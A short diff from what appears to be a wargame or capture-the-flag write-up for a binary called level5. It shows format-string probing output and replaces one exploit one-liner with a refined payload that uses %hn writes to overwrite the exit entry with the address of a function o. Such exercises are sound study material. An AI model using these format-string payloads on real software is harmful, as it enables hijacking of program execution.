@@ -9,6 +9,6 @@ objdump -t ./level5 | grep o
 AAAA %x %x %x %x
 AAAA 200 b7fd1ac0 b7ff37d0 41414141
 
-(python -c print'"\x38\x98\x04\x08" + "%134513828x%4$n"'; cat -) | ./level5
+(cat <(python -c 'print "\x40\x98\x04\x08\x38\x98\x04\x08%2044x%4$hn%31904x%5$hn"') -) | ./level5
 ```
 Here we want to modify to address of `exit` with the address of `o`.
